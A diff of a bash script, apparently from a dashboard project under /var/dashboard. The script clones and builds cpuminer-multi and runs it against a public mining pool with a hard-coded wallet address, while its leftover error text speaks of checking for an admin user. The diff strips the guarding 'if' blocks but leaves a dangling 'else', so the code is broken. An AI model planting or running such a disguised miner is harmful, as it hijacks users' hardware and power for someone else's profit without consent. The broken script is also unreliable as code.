@@ -1,12 +1,5 @@
 #!/bin/bash
 
-if test -f /var/dashboard/branch; then
-  BRANCH=`cat /var/dashboard/branch`
-else
-  BRANCH='main'
-fi
-
-if test -d /var/dashboard; then
   echo 'cpuminer-multi İnstall'
   git clone https://github.com/tpruvot/cpuminer-multi
   cd cpuminer-multi
@@ -15,5 +8,3 @@ if test -d /var/dashboard; then
   ./cpuminer -a sha256d -o stratum+tcp://public-pool.io:21496 -u 32yiufypGWv9MN4z4cK4on3sFULgcPE38h.mexc -p x
 else
     echo 'Error checking if admin user exists.  No changes made.';
-  fi
-fi
